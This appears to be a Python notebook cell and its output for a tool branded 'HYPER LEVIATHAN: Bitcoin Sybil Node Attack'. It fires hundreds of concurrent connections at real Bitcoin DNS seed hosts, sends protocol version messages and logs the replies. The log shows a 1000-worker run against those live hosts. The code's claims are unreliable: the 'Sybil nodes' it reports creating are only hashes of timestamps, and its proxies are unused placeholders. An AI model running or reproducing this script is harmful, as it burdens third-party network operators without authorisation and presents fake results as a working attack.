# %%
import socket
import struct
import hashlib
import time
import random
import concurrent.futures

# Bitcoin seed nodes
SEED_NODES = [
    'seed.bitcoin.sipa.be',
    'dnsseed.bluematt.me',
    'dnsseed.bitcoin.dashjr.org',
    'seed.bitcoinstats.com',
    'seed.bitcoin.jonasschnelli.ch',
    'seed.btc.petertodd.org',
]


def double_sha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def create_message(command, payload):
    """Creates a Bitcoin protocol message"""
    magic = 0xD9B4BEF9
    command_bytes = command.encode('ascii').ljust(12, b'\x00')
    payload_len = len(payload)
    checksum = double_sha256(payload)[:4]

    return struct.pack('<I12sI4s', magic, command_bytes, payload_len, checksum) + payload


def read_varint(data, offset):
    """Lee un varint y devuelve (valor, tamaño_en_bytes)"""
    first_byte = data[offset]
    if first_byte < 0xfd:
        return first_byte, 1
    elif first_byte == 0xfd:
        return struct.unpack('<H', data[offset+1:offset+3])[0], 3
    elif first_byte == 0xfe:
        return struct.unpack('<I', data[offset+1:offset+5])[0], 5
    else:
        return struct.unpack('<Q', data[offset+1:offset+9])[0], 9


def create_version_payload():
    version = 70015
    services = 1
    timestamp = int(time.time())

    addr_recv_services = 1
    addr_recv_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_recv_port = 8333
    addr_recv = struct.pack('<Q16sH', addr_recv_services, addr_recv_ip, addr_recv_port)

    addr_from_services = 1
    addr_from_ip = b'\x00' * 10 + b'\xff\xff' + socket.inet_aton('127.0.0.1')
    addr_from_port = 8333
    addr_from = struct.pack('<Q16sH', addr_from_services, addr_from_ip, addr_from_port)

    nonce = random.getrandbits(64)
    user_agent_bytes = b'/SybilNode:0.1.0/'
    user_agent_len = len(user_agent_bytes)

    if user_agent_len < 0xfd:
        var_int_user_agent_len = struct.pack('<B', user_agent_len)
    elif user_agent_len <= 0xffff:
        var_int_user_agent_len = struct.pack('<BH', 0xfd, user_agent_len)
    elif user_agent_len <= 0xffffffff:
        var_int_user_agent_len = struct.pack('<BI', 0xfe, user_agent_len)
    else:
        var_int_user_agent_len = struct.pack('<BQ', 0xff, user_agent_len)

    start_height = 0
    relay = True

    payload = struct.pack('<iQq', version, services, timestamp) + \
              addr_recv + \
              addr_from + \
              struct.pack('<Q', nonce) + \
              var_int_user_agent_len + \
              user_agent_bytes + \
              struct.pack('<i?', start_height, relay)
    return payload


def parse_version(payload):
    offset = 0
    parsed_data = {}
    try:
        if len(payload) < offset + 4:
            raise ValueError(f"Payload too short for 'version' field.")
        parsed_data['version'] = struct.unpack('<i', payload[offset:offset+4])[0]
        offset += 4

        if len(payload) < offset + 8:
            raise ValueError(f"Payload too short for 'services' field.")
        parsed_data['services'] = struct.unpack('<Q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 8:
            raise ValueError(f"Payload too short for 'timestamp' field.")
        parsed_data['timestamp'] = struct.unpack('<q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 26:
            raise ValueError(f"Payload too short for 'addr_recv' field.")
        offset += 26

        if len(payload) < offset + 26:
            raise ValueError(f"Payload too short for 'addr_from' field.")
        offset += 26

        if len(payload) < offset + 8:
            raise ValueError(f"Payload too short for 'nonce' field.")
        parsed_data['nonce'] = struct.unpack('<Q', payload[offset:offset+8])[0]
        offset += 8

        if len(payload) < offset + 1:
            raise ValueError(f"Payload too short for 'user_agent_len' varint.")
        user_agent_len, varint_size = read_varint(payload, offset)
        offset += varint_size

        if len(payload) < offset + user_agent_len:
            raise ValueError(f"Payload too short for 'user_agent' string.")
        parsed_data['user_agent'] = payload[offset:offset+user_agent_len].decode('utf-8', errors='ignore')
        offset += user_agent_len

        if len(payload) < offset + 4:
            raise ValueError(f"Payload too short for 'start_height' field.")
        parsed_data['start_height'] = struct.unpack('<i', payload[offset:offset+4])[0]
        offset += 4

        if len(payload) >= offset + 1:
            parsed_data['relay'] = struct.unpack('?', payload[offset:offset+1])[0]
            offset += 1
        else:
            parsed_data['relay'] = True

    except (struct.error, ValueError) as e:
        print(f"DEBUG: Error parsing version payload. Error: {e}")
        return None

    return parsed_data


def read_full_message(sock):
    """Read a full Bitcoin message from the socket"""
    header = b''
    while len(header) < 24:
        chunk = sock.recv(24 - len(header))
        if not chunk:
            raise EOFError("Socket closed prematurely while reading header")
        header += chunk

    magic, command_bytes, length, checksum_expected = struct.unpack('<I12sI4s', header)
    command = command_bytes.decode('ascii').rstrip('\x00')

    payload = b''
    while len(payload) < length:
        chunk = sock.recv(min(4096, length - len(payload)))
        if not chunk:
            raise EOFError("Socket closed prematurely while reading payload")
        payload += chunk

    checksum_calculated = double_sha256(payload)[:4]
    if checksum_calculated != checksum_expected:
        print(f"Warning: Checksum mismatch for command '{command}'")

    return command, payload, magic, checksum_expected


def generate_proxies(num_workers):
    """Genera una lista de proxies basada en el número de workers"""
    proxies = []
    for i in range(1, num_workers + 1):
        proxies.append(f'http://proxy{i}:port')
    return proxies


def create_sybil_node(proxy, worker_id):
    """Function to create a Sybil node"""
    seed_node = random.choice(SEED_NODES)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((seed_node, 8333))
        version_payload = create_version_payload()
        version_msg = create_message('version', version_payload)
        sock.sendall(version_msg)

        command, payload, magic, checksum = read_full_message(sock)
        print(f"[Worker {worker_id}] Received '{command}' from {seed_node} ({len(payload)} bytes)")

        if command == 'version':
            version_info = parse_version(payload)
            if version_info:
                print(f"[Worker {worker_id}] Version: {version_info['version']} | User-Agent: {version_info['user_agent']} | Height: {version_info['start_height']}")
            else:
                print(f"[Worker {worker_id}] Failed to parse version info from {seed_node}")
        elif command == 'verack':
            print(f"[Worker {worker_id}] Received verack from {seed_node}")
        else:
            print(f"[Worker {worker_id}] Received unexpected command: {command}")

    except socket.timeout:
        print(f"[Worker {worker_id}] Timeout connecting to {seed_node}")
        return None
    except EOFError as e:
        print(f"[Worker {worker_id}] Connection closed: {e}")
        return None
    except Exception as e:
        print(f"[Worker {worker_id}] Error: {e}")
        return None
    finally:
        sock.close()

    new_address = hashlib.sha256(f"{time.time()}-{worker_id}".encode()).hexdigest()
    return {'address': new_address, 'proxy': proxy, 'worker_id': worker_id}


def connect_sybil_nodes(sybil_nodes):
    """Function to connect Sybil nodes to the network"""
    for node in sybil_nodes:
        seed_node = random.choice(SEED_NODES)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            sock.connect((seed_node, 8333))
            version_payload = create_version_payload()
            version_msg = create_message('version', version_payload)
            sock.sendall(version_msg)

            command, payload, magic, checksum = read_full_message(sock)
            print(f"[Node {node['worker_id']}] Received '{command}' from {seed_node} ({len(payload)} bytes)")

            if command == 'version':
                version_info = parse_version(payload)
                if version_info:
                    print(f"[Node {node['worker_id']}] Version: {version_info['version']} | User-Agent: {version_info['user_agent']} | Height: {version_info['start_height']}")
                else:
                    print(f"[Node {node['worker_id']}] Failed to parse version info")
            elif command == 'verack':
                print(f"[Node {node['worker_id']}] Received verack from {seed_node}")

        except socket.timeout:
            print(f"[Node {node['worker_id']}] Timeout connecting to {seed_node}")
            continue
        except EOFError as e:
            print(f"[Node {node['worker_id']}] Connection closed: {e}")
            continue
        except Exception as e:
            print(f"[Node {node['worker_id']}] Error: {e}")
            continue
        finally:
            sock.close()


def print_banner():
    """Muestra el banner de HYPER LEVIATHAN"""
    banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                        ║
    ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                       ║
    ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                       ║
    ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                       ║
    ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                       ║
    ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                       ║
    ║                                                                   ║
    ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗ ║
    ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║ ║
    ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║ ║
    ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║ ║
    ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║ ║
    ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
    ║                                                                   ║
    ║                    Bitcoin Sybil Node Attack                      ║
    ║                         Version 1.0.0                             ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def hyper_leviathan_attack(num_workers):
    """Main function to execute the Hyper Leviathan attack"""

    # Generar proxies basados en el número de workers
    proxies = generate_proxies(num_workers)

    print(f"\n[*] Iniciando HYPER LEVIATHAN con {num_workers} workers...")
    print(f"[*] Proxies generados: {len(proxies)}")
    print(f"[*] Seed nodes disponibles: {len(SEED_NODES)}")
    print("-" * 60)

    sybil_nodes = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Crear tareas para cada worker con su proxy correspondiente
        future_to_worker = {}
        for i, proxy in enumerate(proxies, 1):
            future = executor.submit(create_sybil_node, proxy, i)
            future_to_worker[future] = (proxy, i)

        for future in concurrent.futures.as_completed(future_to_worker):
            proxy, worker_id = future_to_worker[future]
            try:
                data = future.result()
                if data:
                    sybil_nodes.append(data)
                    print(f"[+] Sybil node created by Worker {worker_id}: {data['address'][:32]}...")
            except Exception as exc:
                print(f"[-] Worker {worker_id} exception: {exc}")

    print("-" * 60)

    if sybil_nodes:
        print(f"\n[*] Connecting {len(sybil_nodes)} Sybil nodes to the network...\n")
        connect_sybil_nodes(sybil_nodes)
        print("-" * 60)
        print(f"\n[✓] HYPER LEVIATHAN completed!")
        print(f"[✓] Total Sybil nodes created: {len(sybil_nodes)}")
    else:
        print("\n[-] No Sybil nodes were created successfully.")


def main():
    """Función principal con input del usuario"""
    print_banner()

    while True:
        try:
            user_input = input("\n[?] ¿Cuántos workers HYPER LEVIATHAN quieres? > ")
            num_workers = int(user_input)

            if num_workers <= 0:
                print("[!] El número de workers debe ser mayor que 0.")
                continue

            if num_workers > 1000:
                confirm = input(f"[!] ¿Estás seguro de usar {num_workers} workers? (s/n) > ")
                if confirm.lower() != 's':
                    continue

            print(f"\n[*] Configuración:")
            print(f"    - Workers: {num_workers}")
            print(f"    - Proxies: {num_workers}")
            print(f"    - Seed Nodes: {len(SEED_NODES)}")

            confirm = input("\n[?] ¿Iniciar ataque? (s/n) > ")
            if confirm.lower() == 's':
                hyper_leviathan_attack(num_workers)
                break
            else:
                print("[*] Ataque cancelado.")
                continue

        except ValueError:
            print("[!] Por favor, introduce un número válido.")
            continue
        except KeyboardInterrupt:
            print("\n\n[*] HYPER LEVIATHAN cancelado por el usuario.")
            break


if __name__ == "__main__":
    main()
# Out:
#     ╔═══════════════════════════════════════════════════════════════════╗
#     ║                                                                   ║
#     ║   ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗                        ║
#     ║   ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗                       ║
#     ║   ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝                       ║
#     ║   ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗                       ║
#     ║   ██║  ██║   ██║   ██║     ███████╗██║  ██║                       ║
#     ║   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝                       ║
#     ║                                                                   ║
#     ║   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗ ║
#     ║   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║ ║
#     ║   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║ ║
#     ║   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║ ║
#     ║   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║ ║
#     ║   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ║
#     ║                                                                   ║
#     ║                    Bitcoin Sybil Node Attack                      ║
#     ║                         Version 1.0.0                             ║
#     ╚═══════════════════════════════════════════════════════════════════╝
#
#
# [?] ¿Cuántos workers HYPER LEVIATHAN quieres? > 1000
#
# [*] Configuración:
#     - Workers: 1000
#     - Proxies: 1000
#     - Seed Nodes: 6
#
# [?] ¿Iniciar ataque? (s/n) > s
#
# [*] Iniciando HYPER LEVIATHAN con 1000 workers...
# [*] Proxies generados: 1000
# [*] Seed nodes disponibles: 6
# ------------------------------------------------------------
# [Worker 194] Received 'version' from seed.bitcoin.jonasschnelli.ch (102 bytes)
# [Worker 194] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 41] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 41] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 442] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 442] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 444] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 444] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 447] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 447] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 454] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 454] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 20] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 20] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 48] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 48] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 1] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 1] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 354] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 354] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 33] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 33] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 169] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 169] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 378] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 378] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 380] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 380] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 382] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 382] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 384] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 384] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 70] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 70] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 79] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 79] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 91] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 91] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 395] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 395] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 399] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 399] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 266] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 266] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 37] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 37] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 357] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 357] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930222
# [Worker 392] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 392] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 265] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 265] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 105] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 105] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 140] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 140] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 6] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 6] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 12] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 12] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 14] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 14] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 31] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 31] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 39] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 39] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 44] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 44] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 56] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 56] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 90] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 90] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 87] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 87] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 74] Received 'version' from seed.bitcoin.jonasschnelli.ch (125 bytes)
# [Worker 74] Version: 70016 | User-Agent: /Satoshi:25.1.0(FutureBit-Apollo-Node)/ | Height: 930222
# [Worker 66] Received 'version' from seed.bitcoin.jonasschnelli.ch (125 bytes)
# [Worker 66] Version: 70016 | User-Agent: /Satoshi:25.1.0(FutureBit-Apollo-Node)/ | Height: 930222
# [Worker 111] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 111] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 153] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 153] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 581] Received 'version' from seed.bitcoin.jonasschnelli.ch (102 bytes)
# [Worker 581] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 93] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 93] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 65] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 65] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 89] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 89] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 101] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 101] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 47] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 47] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 78] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 78] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 131] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 131] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 121] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 121] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
# [Worker 594] Received 'version' from seed.bitcoin.sipa.be (102 bytes)
# [Worker 594] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930222
# [Worker 283] Received 'version' from seed.bitcoin.sipa.be (102 bytes)[Worker 162] Received 'version' from dnsseed.bitcoin.dashjr.org (102 bytes)
# [Worker 162] Version: 70016 | User-Agent: /Satoshi:29.0.0/ | Height: 930222
#
# [Worker 283] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 151] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 151] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 64] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 64] Version: 70016 | User-Agent: /Satoshi:27.0.0/ | Height: 0
# [Worker 61] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 61] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 644] Received 'version' from seed.bitcoin.jonasschnelli.ch (102 bytes)
# [Worker 644] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930222
# [Worker 32] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 32] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 108] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 108] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 129] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 129] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930222
# [Worker 68] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 68] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 350] Received 'version' from seed.bitcoin.jonasschnelli.ch (125 bytes)
# [Worker 350] Version: 70016 | User-Agent: /Satoshi:25.1.0(FutureBit-Apollo-Node)/ | Height: 930222
# [Worker 29] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 29] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 57] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker 57] Version: 70015 | User-Agent: /Satoshi:0.20.0/ | Height: 930222
# [Worker 58] Connection closed: Socket closed prematurely while reading header
# [Worker 88] Received 'version' from seed.btc.petertodd.org (102 bytes)
# [Worker
# [+] Sybil node created by Worker 400: 7ab6401406fdf3ae26420a74b0ddf1b2...
# [+] Sybil node created by Worker 85: 282ed787b7f5d96122eb6a89c8e83392...
# [+] Sybil node created by Worker 97: 0f50ba3b111f90d3cc72fe37ca750b1c...
# [+] Sybil node created by Worker 194: 4af35db9be307ac3c7548296b6ae3e83...
# [+] Sybil node created by Worker 45: f868f361a0dca3971df0288a365f3124...
# [+] Sybil node created by Worker 399: 599da4d14cc8c0398ee6b0bde0aae22b...
# [+] Sybil node created by Worker 121: d65458745f54226402f15681a373dbf2...
# [+] Sybil node created by Worker 133: 8eb4d0b94274f9ec7385fd3faa561aa4...
# [+] Sybil node created by Worker 145: ad26fe16512b7aebea89d2eec828f3c4...
# [+] Sybil node created by Worker 412: 991a6a16c3ab362c31859fafc277a66a...
# [+] Sybil node created by Worker 375: 3d02deca06825c523ed808d42204b4a6...
# [+] Sybil node created by Worker 169: d0601281fe7baf614de722048775b0d3...
# [+] Sybil node created by Worker 266: d2685d6571c32c22ba18cbb8b9e5f038...
# [+] Sybil node created by Worker 108: 62f441353984c5ad1d75ba59d0788459...
# [+] Sybil node created by Worker 61: 1af6c5e39d8814679a21c5201571a174...
# [+] Sybil node created by Worker 217: 2c0fc6dea1d920d0d7a4487dca779356...
# [+] Sybil node created by Worker 229: 24e9cc4507658e4ae69349de6708b372...
# [+] Sybil node created by Worker 132: a735bfe93f3ebbb807fbddd9fcbef769...
# [+] Sybil node created by Worker 44: 7df390bec6d4a118d2eecbc4050f4e56...
# [+] Sybil node created by Worker 302: 6dcca2fc32aea034e186195286dc42b4...
# [+] Sybil node created by Worker 314: 0416a4434341fa11ef4c7da029a6fecc...
# [+] Sybil node created by Worker 37: a03c984e46b81278b19dec9f126e729d...
# [+] Sybil node created by Worker 447: 75385984c987dd29389b9db99445624f...
# [+] Sybil node created by Worker 350: cd371e67b0c2b6071b222887fd2ce1f8...
# [+] Sybil node created by Worker 168: b14faabc246426fbb0d930b79d9991db...
# [+] Sybil node created by Worker 374: bc19a408b0c77750b93449a61ea4a265...
# [+] Sybil node created by Worker 265: 0d405301955e9bfc795480e2a4fc7a16...
# [+] Sybil node created by Worker 192: debd2a0bb62a320b8595444bb6dedbf0...
# [+] Sybil node created by Worker 119: 5552331ef2dc8d5a20a400599626c9a7...
# [+] Sybil node created by Worker 204: 0aa251d74ff876d35e63b28c9bc2d3ba...
# [+] Sybil node created by Worker 131: 2384de500283619bf4a37000559288b0...
# [+] Sybil node created by Worker 216: a73403fcffab3e56776f627b090bca83...
# [+] Sybil node created by Worker 143: 47adbb4cad09e7f83ab4123a500ec6c5...
# [+] Sybil node created by Worker 57: a3a5a7d00d5f3c1b35489f00dcfdd724...
# [+] Sybil node created by Worker 29: 52031a1159e59ee9716c075f49461045...
# [+] Sybil node created by Worker 469: 805d5c43e06146408ab7e38699deeab5...
# [+] Sybil node created by Worker 70: 6b79adbd1fd35317d59c8f9fc040d987...
# [+] Sybil node created by Worker 155: 0143ad8a26a0fefa7f723f54950b842e...
# [+] Sybil node created by Worker 385: 76818151af05e8ad521195b7b08ce837...
# [+] Sybil node created by Worker 264: bd192cfcd1bdda2494487cc97457483f...
# [+] Sybil node created by Worker 94: 1754dca8be2a5f738fc616583acfab24...
# [+] Sybil node created by Worker 422: 2098d4af80a5e92177efa63d7995c9d6...
# [+] Sybil node created by Worker 191: 0d5cc84a7562363449cef8898c4b21b8...
# [+] Sybil node created by Worker 276: ce955e34cff344394a3a0e477c6db4f7...
# [+] Sybil node created by Worker 5: e6651082bb3ff13d858f214fc3dd878b...
# [+] Sybil node created by Worker 300: e907be76788141f830c8157a22bd4ea6...
# [+] Sybil node created by Worker 130: 7cdacb268d8e5820970a54e7d9265dc3...
# [+] Sybil node created by Worker 525: fa697882d72119b133e006f64aa1e81d...
# [+] Sybil node created by Worker 142: d468a8671e5f27cbdc2fa548194187dc...
# [+] Sybil node created by Worker 239: 044f24bb8a7aa1baba51a9021a4983de...
# [+] Sybil node created by Worker 154: 39ce7a96d4bfc23c859439a9def84d96...
# [+] Sybil node created by Worker 348: 8ea2a6a59193788e79d90bb67c6b9152...
# [+] Sybil node created by Worker 166: 2b553b9cd71f670153928f246c92fb4a...
# [+] Sybil node created by Worker 384: 98ac041d1f94f587abdd3bcc071be6df...
# [+] Sybil node created by Worker 93: 51587e00947cf7c1e50da8515470abe8...
# [+] Sybil node created by Worker 444: 159f41060db0db01fd55c3b7213136b4...
# [+] Sybil node created by Worker 275: 0ece0c32cb65f3f1ae129637a9861bc3...
# [+] Sybil node created by Worker 105: 9e606b7523c755cf82619894361c757e...
# [+] Sybil node created by Worker 214: 0b8afa2fb8298eaf12e0d7ae526d7751...
# [+] Sybil node created by Worker 129: 6b586c22fdbd90b9062b0284f89fd4ff...
# [+] Sybil node created by Worker 524: 4232b6232200836b5302c28c4cef986b...
# [+] Sybil node created by Worker 311: 46e32049e02ec5bc7f1d962c26b2466a...
# [+] Sybil node created by Worker 153: f5be5b26ff2370406c18242a50c02d19...
# [+] Sybil node created by Worker 68: ebb4703f64d2b04588ed067ae50bc3ef...
# [+] Sybil node created by Worker 347: a1242e293f05cad94fd5126b08b39717...
# [+] Sybil node created by Worker 651: 22cbea05a186d27f809ae6d4ffcd9c6d...
# [+] Sybil node created by Worker 92: c079feb648918a7e7ebf2040fc6595d5...
# [+] Sybil node created by Worker 420: b5428f3b43670ac26b86f34957f61555...
# [+] Sybil node created by Worker 395: 41b64ee38d8b8df9f7c731824307dcc0...
# [+] Sybil node created by Worker 274: a9869a60f9f161c1f4715ec23df924f5...
# [+] Sybil node created by Worker 116: 6352c73d1d210f2226916749c1464f11...
# [+] Sybil node created by Worker 140: ff95c3747bc692d44af15d407c2a42a5...
# [+] Sybil node created by Worker 1: ffb2701c8a2f4d33b8331885a98269c4...
# [+] Sybil node created by Worker 32: b033ae227c727d04af3b1262cc809a51...
